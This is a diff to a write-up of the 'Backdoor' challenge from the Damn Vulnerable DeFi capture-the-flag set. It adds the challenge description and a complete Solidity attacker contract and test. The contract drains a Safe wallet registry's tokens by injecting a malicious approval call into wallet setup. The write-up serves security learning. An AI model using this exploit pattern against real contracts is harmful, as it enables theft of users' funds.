@@ -841,6 +841,11 @@ Attack flow:
 
 ### Challenge Overview
 
+To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.    
+The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.   
+Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. 
+Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.    
+
 ### Vulnerability Analysis
 
 The Backdoor challenge exposes a vulnerability in the integration between the WalletRegistry and Safe wallet initialization process. The registry implements rewards for beneficiaries who deploy wallets but fails to properly validate all aspects of wallet creation.
@@ -891,3 +896,92 @@ Attack flow:
 5. After collecting tokens from all four beneficiaries, transfer the total 40 DVT to the recovery address
 
 ### Solution
+
+    contract Attacker {
+        Safe singletonCopy;
+        SafeProxyFactory walletFactory;
+        DamnValuableToken token;
+        WalletRegistry walletRegistry;
+        address[] beneficiaries;
+        address recovery;
+        uint immutable AMOUNT_TOKENS_DISTRIBUTED;
+
+        constructor(
+            Safe _singletonCopy,
+            SafeProxyFactory _walletFactory,
+            DamnValuableToken _token,
+            WalletRegistry walletRegistryAddress,
+            address[] memory _beneficiaries,
+            address recoveryAddress,
+            uint amountTokensDistributed
+        ) payable {
+            singletonCopy = _singletonCopy;
+            walletFactory = _walletFactory;
+            token = _token;
+            walletRegistry = walletRegistryAddress;
+            beneficiaries = _beneficiaries;
+            recovery = recoveryAddress;
+            AMOUNT_TOKENS_DISTRIBUTED = amountTokensDistributed;
+        }
+        
+        function approveTokens(DamnValuableToken _token, address spender) external {
+            _token.approve(spender, type(uint256).max);
+        }
+        
+        function attack() public {
+            for (uint i = 0; i < beneficiaries.length; i++) {
+                address newOwner = beneficiaries[i];
+                address[] memory owners = new address[](1);
+                owners[0] = newOwner;
+                
+                bytes memory maliciousData = abi.encodeCall(
+                    this.approveTokens,
+                    (token, address(this))
+                );
+                
+                bytes memory initializer = abi.encodeCall(
+                    Safe.setup,
+                    (
+                        owners,
+                        1,
+                        address(this),
+                        maliciousData,
+                        address(0),
+                        address(0),
+                        0,
+                        payable(address(0))
+                    )
+                );
+                
+                SafeProxy proxy = walletFactory.createProxyWithCallback(
+                    address(singletonCopy),
+                    initializer,
+                    1,
+                    walletRegistry
+                );
+                
+                token.transferFrom(
+                    address(proxy),
+                    address(this),
+                    token.balanceOf(address(proxy))
+                );
+            }
+            token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
+        }
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_backdoor() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(
+            singletonCopy,
+            walletFactory,
+            token,
+            walletRegistry,
+            users,
+            recovery,
+            AMOUNT_TOKENS_DISTRIBUTED
+        );
+        attacker.attack();
+    }
